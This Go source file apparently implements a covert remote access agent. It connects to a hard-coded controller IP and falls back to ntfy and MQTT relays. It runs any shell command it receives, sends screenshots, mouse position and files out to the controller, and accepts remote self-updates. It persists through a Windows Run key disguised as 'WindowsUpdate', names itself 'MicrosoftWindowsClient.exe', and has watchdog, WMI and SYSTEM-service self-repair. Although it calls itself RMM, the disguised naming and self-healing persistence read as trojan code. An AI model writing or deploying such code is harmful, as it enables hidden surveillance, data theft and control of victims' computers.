			_ = relay.PublishTo(me, "controller", protocol.Message{Type: protocol.TypeKeyExchange, Hostname: hn, Instance: instanceID(), Data: wrapped})
		}
	}
	log.Printf("[*] Ntfy relay: publishing connect %s/%s", hn, user)
	announce()
	// Long-poll in its own goroutine: relay.Poll blocks up to ~60s when
	// idle (one hanging GET, not the old 900ms hot loop that got us banned).
	inbox := make(chan relay.Envelope, 64)
	go func() {
		for {
			select {
			case <-a.closing:
				return
			default:
			}
			// Only messages addressed to us (or broadcast "") — fixes
			// cross-talk where every agent executed every command.
			envs, err := relay.Poll(me, hn)
			if err != nil {
				log.Printf("[ntfy] poll: %v", err)
				select {
				case <-a.closing:
					return
				case <-time.After(2 * time.Second):
				}
				continue
			}
			for _, env := range envs {
				select {
				case inbox <- env:
				case <-a.closing:
					return
				}
			}
		}
	}()
	mouseTicker := time.NewTicker(2 * time.Second) // throttled: ntfy is rate-limited
	defer mouseTicker.Stop()
	announceTicker := time.NewTicker(25 * time.Second) // re-announce so restarted controllers find us (quiet: presence is cheap, chatter isn't)
	defer announceTicker.Stop()
	// nout publishes agent->controller messages, sealed when E2E is active.
	nout := func(msg protocol.Message) {
		_ = relay.PublishEnvelope(commands.E2EEnvelope(me, "controller", msg, nowMillis()))
	}
	lastX, lastY := -1, -1
	for {
		select {
		case <-a.closing:
			return nil
		case <-announceTicker.C:
			if a.quietRemain() > 0 {
				continue // stay quiet: don't re-announce a session the user ended
			}
			announce()
			case env := <-inbox:
			{
				payload := env.Payload
				if env.Enc {
					plain, ok := commands.E2EOpen(payload)
					if !ok {
						log.Printf("[!] ntfy: undecryptable payload, dropped")
						continue
					}
					payload = plain
				}
				var msg protocol.Message
				if err := json.Unmarshal(payload, &msg); err != nil {
					continue
				}
				if !strings.HasPrefix(env.From, "controller") {
					continue
				}
				if msg.Target != "" && msg.Target != hn && msg.Target != me {
					continue
				}
				switch msg.Type {
				case protocol.TypeConnected:
					// Ignore acks meant for a different agent process.
					if msg.ID != "" && !strings.Contains(msg.ID, hn) {
						continue
					}
					if msg.E2E {
						commands.E2EEnable(true)
					}
					noteAck(msg)
					log.Printf("[*] Ntfy controller ack %s", msg.ID)
				case protocol.TypeUpdateBegin:
					log.Printf("[*] Ntfy update begin %s", msg.UpdateVer)
					res, err := commands.StartAgentUpdate(msg.UpdateVer, msg.UpdateSize, msg.UpdateSHA, msg.UpdateTotal, msg.UpdateGzip)
					nout(updateOutput(res, err))
				case protocol.TypeUpdateChunk:
					res, err := commands.WriteUpdateChunk(msg.UpdateSeq, msg.Data)
					if res == "" && err == nil {
						continue
					}
					nout(updateOutput(res, err))
				case protocol.TypeFileDlReq:
					go fileDlStream(msg.FilePath, msg.FileFrom, msg.FileChunk, func(m protocol.Message) error {
						nout(m)
						return nil
					})
				case protocol.TypeFileUlBegin:
					res, err := commands.StartFileUl(msg.FilePath, msg.FileSize, msg.FileSHA, msg.FileTotal)
					nout(updateOutput(res, err))
				case protocol.TypeFileUlChunk:
					res, err := commands.WriteFileUlChunk(msg.FileSeq, msg.Data, msg.FileChunk)
					if res == "" && err == nil {
						continue
					}
					nout(updateOutput(res, err))
				case protocol.TypeCommand:
					log.Printf("[*] Ntfy command: %s", msg.Cmd)
					if isKillCmd(msg.Cmd) {
						_ = relay.PublishTo(me, "controller", protocol.Message{Type: protocol.TypeOutput, Result: "agent process exiting (kill-agent)"})
						exitSoon("ntfy")
						continue
					}
					cmdName := strings.TrimSpace(msg.Cmd)
					args := ""
					if idx := strings.Index(cmdName, " "); idx != -1 {
						args = strings.TrimSpace(cmdName[idx+1:])
						cmdName = strings.TrimSpace(cmdName[:idx])
					}
				result, suppressed, err := commands.ExecuteChecked(msg.CmdID, cmdName, args)
				if suppressed {
					log.Printf("[*] Duplicate %s suppressed", msg.CmdID)
					nout(protocol.Message{Type: protocol.TypeOutput, CmdID: msg.CmdID})
					continue
				}
					errStr := ""
					if err != nil {
						errStr = err.Error()
						if result == "" {
							result = errStr
							errStr = ""
						}
					}
					if len(result) > 700*1024 {
						result = result[:700*1024] + "\n... truncated (ntfy limit)"
					}
					nout(protocol.Message{Type: protocol.TypeOutput, Result: result, Error: errStr, CmdID: msg.CmdID})
				case protocol.TypeScreenshotRequest:
					q := msg.Quality
					if q <= 0 {
						q = 70 // ntfy default: JPEG fits the relay cap
					}
					if msg.Tiles {
						msgs, err := captureTiled(q, msg.Monitor, msg.AllMonitors, msg.Scale)
						if err != nil {
							nout(protocol.Message{Type: protocol.TypeScreen, Error: err.Error()})
							continue
						}
						for _, m := range msgs {
							nout(m)
						}
						continue
					}
					s0 := frameSeq.Load()
					data, w, h, ox, oy, format, err := captureImage(q, msg.Monitor, msg.AllMonitors, msg.Scale)
					if err != nil {
						nout(protocol.Message{Type: protocol.TypeScreen, Error: err.Error()})
						continue
					}
					if frameSeq.Load() != s0 {
						continue // superseded by a newer frame; UI would drop this one
					}
					b64 := base64.StdEncoding.EncodeToString(data)
					if len(b64) > 700*1024 {
						nout(protocol.Message{Type: protocol.TypeScreen, Error: "screen too large for ntfy relay (use direct connection)"})
						continue
					}
					nout(protocol.Message{Type: protocol.TypeScreen, Width: w, Height: h, OX: ox, OY: oy, Data: b64, Format: format, FSeq: nextFrameSeq()})
				case protocol.TypePing:
					_ = relay.PublishTo(me, "controller", protocol.Message{Type: protocol.TypePong})
				case protocol.TypeDisconnect:
					// User ended the session: go quiet (outer loop honors
					// quietUntil instead of reconnecting). PC untouched.
					a.setQuiet(disconnectQuiet)
					return nil
				}
			}
		case <-mouseTicker.C:
			x, y := getMousePos()
			if x == lastX && y == lastY {
				continue
			}
			lastX, lastY = x, y
			nout(protocol.Message{Type: protocol.TypeMouse, X: x, Y: y})
		}
	}
}

// relaySessionActive marks a full relay session (MQTT/ntfy main loop) in
// progress. The listen-only loop below stands down while set, so two relay
// paths never double-handle the same traffic.
var relaySessionActive atomic.Bool

// relayListenOnly keeps a lightweight MQTT command subscription alive
// ALONGSIDE any direct connection, so a second controller house can reach
// this agent through the shared relay. It announces (60s, skipped while
// quiet), answers commands/screenshots/pings/updates, and reseeds E2E keys.
// No mouse ticker here (the direct loop already streams position when up;
// relay modes run their own). Process lifetime; never touches the PC.
func relayListenOnly(a *agent, hn, user, me, caFile string) {
	backoff := 5 * time.Second
	for {
		select {
		case <-a.closing:
			return
		default:
		}
		// Stand down while a full relay session owns the traffic.
		if relaySessionActive.Load() {
			select {
			case <-a.closing:
				return
			case <-time.After(5 * time.Second):
			}
			continue
		}
		if err := relayListenOnce(a, hn, user, me, caFile); err != nil {
			dlog.Printf("[listen] %v", err)
			select {
			case <-a.closing:
				return
			case <-time.After(backoff):
			}
			if backoff < time.Minute {
				backoff *= 2
			}
			continue
		}
		backoff = 5 * time.Second
	}
}

func relayListenOnce(a *agent, hn, user, me, caFile string) error {
	bus, err := mqttrelay.DialAgent(hn)
	if err != nil {
		return err
	}
	defer bus.Close()
	if _, err := commands.E2EInitControllerKey(caFile); err == nil {
		log.Printf("[*] listen-only E2E key ready")
	}
	mout := func(msg protocol.Message) error {
		return bus.Publish("out/"+hn, commands.E2EEnvelope(me, "controller", msg, nowMillis()))
	}
	discCh := make(chan struct{}, 1)
	if err := bus.SubscribeCmd(func(env relay.Envelope) {
		payload := env.Payload
		if env.Enc {
			plain, ok := commands.E2EOpen(payload)
			if !ok {
				return
			}
			payload = plain
		}
		var msg protocol.Message
		if err := json.Unmarshal(payload, &msg); err != nil {
			return
		}
		if msg.Target != "" && msg.Target != hn && msg.Target != me {
			return
		}
		switch msg.Type {
		case protocol.TypeConnected:
			if msg.ID != "" && !strings.Contains(msg.ID, hn) {
				return
			}
			if msg.E2E {
				commands.E2EEnable(true)
			}
			noteAck(msg)
		case protocol.TypeCommand:
			go func(m protocol.Message) {
				if isKillCmd(m.Cmd) {
					_ = mout(protocol.Message{Type: protocol.TypeOutput, Result: "agent process exiting (kill-agent)"})
					exitSoon("listen")
					return
				}
			resp, suppressed := execCommand(m.Cmd, m.CmdID, 1024*1024, "\n... truncated")
			if suppressed {
				_ = mout(protocol.Message{Type: protocol.TypeOutput, CmdID: m.CmdID})
				return
			}
			_ = mout(resp)
			}(msg)
		case protocol.TypeScreenshotRequest:
			go func(quality, monitor int, all bool, scale float64, tiles bool) {
				if tiles {
					msgs, err := captureTiled(quality, monitor, all, scale)
					if err != nil {
						_ = mout(protocol.Message{Type: protocol.TypeScreen, Error: err.Error()})
						return
					}
					for _, m := range msgs {
						_ = mout(m)
					}
					return
				}
				s0 := frameSeq.Load()
				data, w, h, ox, oy, format, err := captureImage(quality, monitor, all, scale)
				if err != nil {
					_ = mout(protocol.Message{Type: protocol.TypeScreen, Error: err.Error()})
					return
				}
				if frameSeq.Load() != s0 {
					return // superseded by a newer frame; UI would drop this one
				}
				b64 := base64.StdEncoding.EncodeToString(data)
				_ = mout(protocol.Message{Type: protocol.TypeScreen, Width: w, Height: h, OX: ox, OY: oy, Data: b64, Format: format, FSeq: nextFrameSeq()})
			}(msg.Quality, msg.Monitor, msg.AllMonitors, msg.Scale, msg.Tiles)
		case protocol.TypeUpdateBegin:
			go func(m protocol.Message) {
				res, err := commands.StartAgentUpdate(m.UpdateVer, m.UpdateSize, m.UpdateSHA, m.UpdateTotal, m.UpdateGzip)
				_ = mout(updateOutput(res, err))
			}(msg)
		case protocol.TypeUpdateChunk:
			go func(m protocol.Message) {
				res, err := commands.WriteUpdateChunk(m.UpdateSeq, m.Data)
				if res == "" && err == nil {
					return
				}
				_ = mout(updateOutput(res, err))
			}(msg)
		case protocol.TypeFileDlReq:
			go func(m protocol.Message) {
				fileDlStream(m.FilePath, m.FileFrom, m.FileChunk, mout)
			}(msg)
		case protocol.TypeFileUlBegin:
			go func(m protocol.Message) {
				res, err := commands.StartFileUl(m.FilePath, m.FileSize, m.FileSHA, m.FileTotal)
				_ = mout(updateOutput(res, err))
			}(msg)
		case protocol.TypeFileUlChunk:
			go func(m protocol.Message) {
				res, err := commands.WriteFileUlChunk(m.FileSeq, m.Data, m.FileChunk)
				if res == "" && err == nil {
					return
				}
				_ = mout(updateOutput(res, err))
			}(msg)
		case protocol.TypePing:
			_ = mout(protocol.Message{Type: protocol.TypePong})
		case protocol.TypeDisconnect:
			a.setQuiet(disconnectQuiet)
			select {
			case discCh <- struct{}{}:
			default:
			}
		}
	}); err != nil {
		return err
	}
	announce := func() {
		_ = bus.Publish("hello", relay.Envelope{From: me, To: "", Payload: mustJSON(helloMsg(hn, user)), Time: nowMillis()})
		if wrapped, ok := commands.E2EWrapped(); ok {
			_ = bus.Publish("out/"+hn, relay.Envelope{From: me, To: "controller", Payload: mustJSON(protocol.Message{Type: protocol.TypeKeyExchange, Hostname: hn, Instance: instanceID(), Data: wrapped}), Time: nowMillis()})
		}
	}
	announce()
	ticker := time.NewTicker(60 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-a.closing:
			return nil
		case <-discCh:
			return nil
		case <-ticker.C:
			if relaySessionActive.Load() {
				return nil // full session took over; exit, outer loop stands by
			}
			if a.quietRemain() > 0 {
				continue
			}
			announce()
		}
	}
}

// connectViaMQTT joins the MQTT relay (persistent outbound TCP 1883, zero
// polling). Tried after direct dials fail, before the slower ntfy polling.
func (a *agent) connectViaMQTT() error {
	hn, user := hostnameAndUser()
	me := "agent:" + hn
	relaySessionActive.Store(true)
	defer relaySessionActive.Store(false)
	bus, err := mqttrelay.DialAgent(hn)
	if err != nil {
		return err
	}
	defer bus.Close()

	if _, err := commands.E2EInitControllerKey(a.caFile); err == nil {
		log.Printf("[*] E2E key ready for relay payloads")
	} else {
		log.Printf("[*] E2E unavailable (%v), relay payloads stay plaintext", err)
	}
	// mout publishes agent->controller messages, sealed when E2E is active.
	mout := func(msg protocol.Message) error {
		return bus.Publish("out/"+hn, commands.E2EEnvelope(me, "controller", msg, nowMillis()))
	}

	discCh := make(chan struct{}, 1) // user-ended session (callback runs on paho's thread)
	if err := bus.SubscribeCmd(func(env relay.Envelope) {
		payload := env.Payload
		if env.Enc {
			plain, ok := commands.E2EOpen(payload)
			if !ok {
				log.Printf("[!] mqtt: undecryptable payload, dropped")
				return
			}
			payload = plain
		}
		var msg protocol.Message
		if err := json.Unmarshal(payload, &msg); err != nil {
			return
		}
		if msg.Target != "" && msg.Target != hn && msg.Target != me {
			return
		}
		switch msg.Type {
		case protocol.TypeConnected:
			if msg.ID != "" && !strings.Contains(msg.ID, hn) {
				return
			}
			if msg.E2E {
				commands.E2EEnable(true)
			}
			noteAck(msg)
			log.Printf("[*] MQTT controller ack %s", msg.ID)
		case protocol.TypeUpdateBegin:
			log.Printf("[*] MQTT update begin %s", msg.UpdateVer)
			go func(m protocol.Message) {
				res, err := commands.StartAgentUpdate(m.UpdateVer, m.UpdateSize, m.UpdateSHA, m.UpdateTotal, m.UpdateGzip)
				if err := mout(updateOutput(res, err)); err != nil {
					log.Printf("[!] MQTT publish update: %v", err)
				}
			}(msg)
		case protocol.TypeUpdateChunk:
			go func(m protocol.Message) {
				res, err := commands.WriteUpdateChunk(m.UpdateSeq, m.Data)
				if res == "" && err == nil {
					return
				}
				if err := mout(updateOutput(res, err)); err != nil {
					log.Printf("[!] MQTT publish update: %v", err)
				}
			}(msg)
		case protocol.TypeFileDlReq:
			go func(m protocol.Message) {
				fileDlStream(m.FilePath, m.FileFrom, m.FileChunk, mout)
			}(msg)
		case protocol.TypeFileUlBegin:
			go func(m protocol.Message) {
				res, err := commands.StartFileUl(m.FilePath, m.FileSize, m.FileSHA, m.FileTotal)
				if err := mout(updateOutput(res, err)); err != nil {
					log.Printf("[!] MQTT publish upload: %v", err)
				}
			}(msg)
		case protocol.TypeFileUlChunk:
			go func(m protocol.Message) {
				res, err := commands.WriteFileUlChunk(m.FileSeq, m.Data, m.FileChunk)
				if res == "" && err == nil {
					return
				}
				if err := mout(updateOutput(res, err)); err != nil {
					log.Printf("[!] MQTT publish upload: %v", err)
				}
			}(msg)
		case protocol.TypeCommand:
			log.Printf("[*] MQTT command: %s", msg.Cmd)
			go func(m protocol.Message) {
				cmdStr := m.Cmd
				if isKillCmd(cmdStr) {
					resp := protocol.Message{Type: protocol.TypeOutput, Result: "agent process exiting (kill-agent)"}
					if err := mout(resp); err != nil {
						log.Printf("[!] MQTT publish output: %v", err)
					}
					exitSoon("mqtt")
					return
				}
			resp, suppressed := execCommand(cmdStr, m.CmdID, 1024*1024, "\n... truncated")
			if suppressed {
				_ = mout(protocol.Message{Type: protocol.TypeOutput, CmdID: m.CmdID})
				return
			}
				if err := mout(resp); err != nil {
					log.Printf("[!] MQTT publish output: %v", err)
				}
			}(msg)
		case protocol.TypeScreenshotRequest:
			go func(quality, monitor int, all bool, scale float64, tiles bool) {
				if tiles {
					msgs, err := captureTiled(quality, monitor, all, scale)
					if err != nil {
						_ = mout(protocol.Message{Type: protocol.TypeScreen, Error: err.Error()})
						return
					}
					for _, m := range msgs {
						_ = mout(m)
					}
					return
				}
				s0 := frameSeq.Load()
				data, w, h, ox, oy, format, err := captureImage(quality, monitor, all, scale)
				if err != nil {
					_ = mout(protocol.Message{Type: protocol.TypeScreen, Error: err.Error()})
					return
				}
				if frameSeq.Load() != s0 {
					log.Printf("[*] MQTT screenshot superseded, dropping")
					return // a newer frame already published; UI would drop this one
				}
				b64 := base64.StdEncoding.EncodeToString(data)
				log.Printf("[*] MQTT captured %dx%d+%d+%d %s %d bytes", w, h, ox, oy, format, len(data))
				_ = mout(protocol.Message{Type: protocol.TypeScreen, Width: w, Height: h, OX: ox, OY: oy, Data: b64, Format: format, FSeq: nextFrameSeq()})
			}(msg.Quality, msg.Monitor, msg.AllMonitors, msg.Scale, msg.Tiles)
		case protocol.TypePing:
				_ = bus.Publish("out/"+hn, relay.Envelope{From: me, To: "controller", Payload: mustJSON(protocol.Message{Type: protocol.TypePong}), Time: nowMillis()})
		case protocol.TypeDisconnect:
				// User ended the session: go quiet, then break the main loop.
				a.setQuiet(disconnectQuiet)
				select {
				case discCh <- struct{}{}:
				default:
				}
		}
	}); err != nil {
		return err
	}

	announce := func() {
		if err := bus.Publish("hello", relay.Envelope{From: me, To: "", Payload: mustJSON(helloMsg(hn, user)), Time: nowMillis()}); err != nil {
			dlog.Printf("[listen] announce failed: %v", err)
			return
		}
		// Key exchange rides the data channel (out/+) so the controller's
		// hello branch (connect-only) never has to special-case it.
		if wrapped, ok := commands.E2EWrapped(); ok {
			if err := bus.Publish("out/"+hn, relay.Envelope{From: me, To: "controller", Payload: mustJSON(protocol.Message{Type: protocol.TypeKeyExchange, Hostname: hn, Instance: instanceID(), Data: wrapped}), Time: nowMillis()}); err != nil {
				dlog.Printf("[listen] keyxchg failed: %v", err)
			}
		}
	}
	log.Printf("[*] MQTT: announcing %s/%s", hn, user)
	announce()
	announceTicker := time.NewTicker(25 * time.Second) // quiet presence: the sweep still converges quickly on re-hello
	defer announceTicker.Stop()
	mouseTicker := time.NewTicker(150 * time.Millisecond) // MQTT is cheap: near-direct cursor feel
	defer mouseTicker.Stop()
	lastX, lastY := -1, -1
	for {
		select {
		case <-a.closing:
			return nil
		case <-discCh:
			return nil
		case <-announceTicker.C:
			if a.quietRemain() > 0 {
				continue // stay quiet: don't re-announce a session the user ended
			}
			announce()
		case <-mouseTicker.C:
			x, y := getMousePos()
			if x == lastX && y == lastY {
				continue
			}
			lastX, lastY = x, y
			_ = mout(protocol.Message{Type: protocol.TypeMouse, X: x, Y: y})
		}
	}
}

func installPersistence() error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("persistence only supported on Windows")
	}
	// Use golang.org/x/sys/windows/registry if available; otherwise use reg command
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	exe, _ = filepath.Abs(exe)
	// Try registry via cmd
	cmd := exec.Command("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "WindowsUpdate", "/t", "REG_SZ", "/d", exe, "/f")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("reg add: %v output=%s", err, string(out))
	}
	log.Printf("[*] Persistence installed: %s -> HKCU Run WindowsUpdate", exe)
	return nil
}

// runDialTest dials each candidate once and exits 0 on first success.
// QoL: `MicrosoftWindowsClient.exe -test` answers "is the controller reachable?" without
// starting the reconnect loop or persistence.
func runDialTest(primary, caFile string, insecure bool) {
	var tlsCfg *tls.Config
	if insecure {
		tlsCfg = &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
	} else {
		caData, err := os.ReadFile(caFile)
		if err != nil {
			fmt.Printf("FAIL: read ca: %v\n", err)
			os.Exit(1)
		}
		pool := x509.NewCertPool()
		if !pool.AppendCertsFromPEM(caData) {
			fmt.Printf("FAIL: parse ca %s\n", caFile)
			os.Exit(1)
		}
		tlsCfg = &tls.Config{RootCAs: pool, MinVersion: tls.VersionTLS12}
	}
	dialer := &net.Dialer{Timeout: 5 * time.Second}
	for _, addr := range dialAddrs(primary, loadHouses()) {
		fmt.Printf("dial %s ... ", addr)
		conn, err := tls.DialWithDialer(dialer, "tcp", addr, tlsCfg)
		if err != nil {
			fmt.Printf("FAIL (%v)\n", err)
			continue
		}
		fmt.Printf("OK\n")
		conn.Close()
		os.Exit(0)
	}
	fmt.Printf("ntfy %s ... ", relay.NtfyTopic)
	if err := relay.PublishTo("agent:test", "controller", protocol.Message{Type: protocol.TypePing}); err != nil {
		fmt.Printf("FAIL (%v)\n", err)
		os.Exit(1)
	}
	fmt.Printf("OK (published)\n")
	os.Exit(0)
}

// loadControllerConfig reads controller.txt next to the exe (written by the
// installer). It lets the controller IP change without rebuilding the agent:
// the flag still wins when explicitly passed.
func loadControllerConfig(def string) string {
	if exe, err := os.Executable(); err == nil {
		if b, err := os.ReadFile(filepath.Join(filepath.Dir(exe), "controller.txt")); err == nil {
			if v := strings.TrimSpace(string(b)); v != "" {
				return strings.Split(v, "\n")[0]
			}
		}
	}
	return def
}

// healthyHeartbeatPath is where the agent stamps a Unix-seconds liveness
// marker every 30s. The watchdog treats a marker older than 90s as hung and
// restarts the process even when it still exists.
func healthyHeartbeatPath() string {
	if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
		return filepath.Join(localApp, "RMM", "healthy")
	}
	return filepath.Join(os.TempDir(), "RMM", "healthy")
}

// startHealthyHeartbeat stamps the healthy file immediately and every 30s.
// Failures are non-fatal (watchdog treats a missing file as unhealthy).
func startHealthyHeartbeat(stop <-chan struct{}) {
	stamp := func() {
		p := healthyHeartbeatPath()
		_ = os.MkdirAll(filepath.Dir(p), 0755)
		_ = os.WriteFile(p, []byte(fmt.Sprintf("%d\n", time.Now().Unix())), 0644)
	}
	stamp()
	t := time.NewTicker(30 * time.Second)
	defer t.Stop()
	for {
		select {
		case <-stop:
			return
		case <-t.C:
			stamp()
		}
	}
}

// dlog is the verbose lane: everything log.* writes PLUS debug-only extras.
// agent.log stays short; agent-debug.log is the superset for deep dives.
var dlog = log.New(io.Discard, "", log.LstdFlags)

// setupLogFile mirrors logs to %LOCALAPPDATA%/RMM/agent.log (short) and
// agent-debug.log (verbose superset; the silent agent otherwise has no
// visible console). Both rotate past 5MB. Failures are non-fatal.
func setupLogFile() {
	const maxLogBytes = 5 << 20
	dir := ""
	if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
		dir = filepath.Join(localApp, "RMM")
	} else {
		dir = filepath.Join(os.TempDir(), "RMM")
	}
	if err := os.MkdirAll(dir, 0755); err != nil {
		return
	}
	rotate := func(p string) {
		if info, err := os.Stat(p); err == nil && info.Size() > maxLogBytes {
			_ = os.Remove(p + ".1")
			_ = os.Rename(p, p+".1")
		}
	}
	shortPath := filepath.Join(dir, "agent.log")
	debugPath := filepath.Join(dir, "agent-debug.log")
	rotate(shortPath)
	rotate(debugPath)
	f, err := os.OpenFile(shortPath, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	df, err := os.OpenFile(debugPath, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		log.SetOutput(io.MultiWriter(os.Stderr, f))
		return
	}
	log.SetOutput(io.MultiWriter(os.Stderr, f, df))
	dlog.SetOutput(df)
}

func main() {
	addr := flag.String("controller", "176.229.98.54:4444", "controller address host:port")
	caFile := flag.String("ca", "certs/server.crt", "CA cert file (server.crt)")
	insecure := flag.Bool("insecure", false, "skip TLS verification (for testing)")
	fps := flag.Float64("fps", 0, "periodic screenshot FPS (0=on-demand only)")
	persist := flag.Bool("persist", false, "install registry persistence and exit")
	ntfyTopic := flag.String("ntfy", "", "ntfy relay topic (empty = default)")
	ntfyServer := flag.String("ntfy-server", "", "ntfy relay host (empty = default)")
	ntfyOnly := flag.Bool("ntfy-only", false, "skip direct dials, use ntfy relay only (mobile: saves battery/time)")
	mqttOnly := flag.Bool("mqtt-only", false, "skip direct dials, use MQTT relay only")
	watchMode := flag.Bool("watch", false, "run as supervisor: keep the agent alive, no network")
	wmiHeal := flag.Bool("wmi-heal", false, "repair tasks+Run keys from local XMLs and exit (WMI timer target)")
	svcHeal := flag.Bool("svc-heal", false, "run as SYSTEM repair service (repairs only, never the agent)")
	testOnly := flag.Bool("test", false, "dial controller once, print result, exit")
	showHelp := flag.Bool("help", false, "show help")
	flag.Parse()

	if *ntfyServer != "" {
		relay.SetServer(*ntfyServer)
	}
	if *ntfyTopic != "" {
		relay.SetTopic(*ntfyTopic)
	}
	// controller.txt next to exe overrides the compiled default (unless the
	// flag was explicitly changed from the default).
	if *addr == "176.229.98.54:4444" {
		if v := loadControllerConfig(""); v != "" {
			*addr = v
		}
	}
	setupLogFile()
	if *svcHeal {
		if err := runSvcHealing(); err != nil {
			log.Fatalf("service: %v", err)
		}
		return
	}
	if *wmiHeal {
		runWmiHeal()
		return
	}
	if *watchMode {
		runWatch()
		return
	}
	commands.EnsureKeepAwake()
	// Liveness marker for the watchdog (process-exists is not enough).
	healthyStop := make(chan struct{})
	defer close(healthyStop)
	go startHealthyHeartbeat(healthyStop)
	// Crash-rollback reporting: if the watchdog restored the previous
	// binary after a crash loop, tell the controller on every hello.
	rollbackNotice = commands.LoadRollbackNotice()
	// Update self-confirm: surviving 90s clears the prev backup + pending
	// claim; crashing first leaves them for the watchdog to roll back.
	go commands.ConfirmUpdate()

	if *showHelp {
		flag.Usage()
		fmt.Println("\nExample:")
		fmt.Println("  MicrosoftWindowsClient.exe -controller 176.229.98.54:4444 -ca certs/server.crt")
		fmt.Println("  MicrosoftWindowsClient.exe -controller localhost:4444 -insecure")
		fmt.Println("  MicrosoftWindowsClient.exe -persist   # install auto-start")
		fmt.Println("  MicrosoftWindowsClient.exe -test      # dial once and exit")
		os.Exit(0)
	}

	// One agent per PC: a new start reaps stale duplicates (zombies that
	// survived upgrades) and takes over. Skipped for -test runs.
	if !*testOnly {
		ensureSingleInstance()
	}

	if *persist {
		if err := installPersistence(); err != nil {
			log.Fatalf("persistence: %v", err)
		}
		return
	}

	// Handle --ca relative to exe dir if not found
	if !*insecure {
		if _, err := os.Stat(*caFile); os.IsNotExist(err) {
			// Try next to exe
			exeDir := filepath.Dir(os.Args[0])
			alt := filepath.Join(exeDir, "server.crt")
			if _, err2 := os.Stat(alt); err2 == nil {
				*caFile = alt
			} else {
				alt2 := filepath.Join(exeDir, "certs", "server.crt")
				if _, err3 := os.Stat(alt2); err3 == nil {
					*caFile = alt2
				}
			}
		}
	}

	if *testOnly {
		runDialTest(*addr, *caFile, *insecure)
		return
	}

	// Graceful shutdown on Ctrl+C
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)

	ag := &agent{
		controllerAddr: *addr,
		caFile:         *caFile,
		insecure:       *insecure,
		screenshotFPS:  *fps,
		closing:        make(chan struct{}),
	}

	// Second-house ear: in default mode (direct capable), keep a lightweight
	// relay listener alongside whatever the main loop uses, so another
	// controller house can reach this agent through the shared bus.
	// Relay-only modes run their own full session; the listener stands down
	// whenever one is active.
	if !*ntfyOnly && !*mqttOnly {
		hn0, user0 := hostnameAndUser()
		me0 := "agent:" + hn0
		ca0 := *caFile
		go relayListenOnly(ag, hn0, user0, me0, ca0)
	}

	go func() {
		<-sigCh
		fmt.Println("\n[*] Signal received, shutting down...")
		close(ag.closing)
		// Give time to send disconnect
		if ag.conn != nil {
			_ = ag.send(protocol.Message{Type: protocol.TypeDisconnect})
			ag.conn.Close()
		}
		os.Exit(0)
	}()

	// Also handle input to allow clean exit via 'exit' typed? Not needed for agent.

	// waitQuiet sleeps out a user-requested quiet period (session ended from
	// the controller). Returns false on shutdown.
	waitQuiet := func() bool {
		if rem := ag.quietRemain(); rem > 0 {
			log.Printf("[*] Quiet period: resuming in %s...", rem.Round(time.Second))
			select {
			case <-ag.closing:
				return false
			case <-time.After(rem):
			}
		}
		return true
	}

	if *ntfyOnly {
		log.Printf("[*] ntfy-only mode: skipping direct dials")
		for {
			if !waitQuiet() {
				return
			}
			_ = ag.connectViaNtfy()
			select {
			case <-ag.closing:
				return
			default:
			}
		}
	}
	if *mqttOnly {
		log.Printf("[*] mqtt-only mode: skipping direct dials")
		for {
			if !waitQuiet() {
				return
			}
			_ = ag.connectViaMQTT()
			select {
			case <-ag.closing:
				return
			default:
			}
		}
	}

	// Reconnect loop with exponential backoff
	backoff := time.Second
	maxBackoff := 30 * time.Second
	for {
		if !waitQuiet() {
			return
		}
		err := ag.connectOnce()
		// Check if closing
		select {
		case <-ag.closing:
			return
		default:
		}
		if err != nil {
			// Check if it's a clean shutdown
			if strings.Contains(err.Error(), "closing") {
				return
			}
			log.Printf("[-] Disconnected: %v — reconnect in %v", err, backoff)
			time.Sleep(backoff)
			backoff *= 2
			if backoff > maxBackoff {
				backoff = maxBackoff
			}
			// Reset encoder/conn
			ag.conn = nil
			ag.enc = nil
			continue
		}
		// Clean disconnect -> reset backoff and reconnect
		log.Printf("[*] Session ended, reconnecting...")
		backoff = time.Second
		ag.conn = nil
		ag.enc = nil
		time.Sleep(backoff)
	}
}
